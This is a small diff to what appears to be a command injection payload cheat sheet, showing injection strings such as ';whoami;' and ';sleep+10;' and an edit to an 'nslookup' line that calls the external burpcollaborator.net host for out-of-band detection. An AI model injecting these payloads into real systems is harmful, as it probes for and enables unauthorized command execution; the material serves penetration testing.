@@ -4,7 +4,7 @@ ___
 ```sh
 ;whoami;
 ;sleep+10;
-nslookup burpcollaborator.net
+nslookup+burpcollaborator.net
 ```
 ## Simple Case
 ```sh
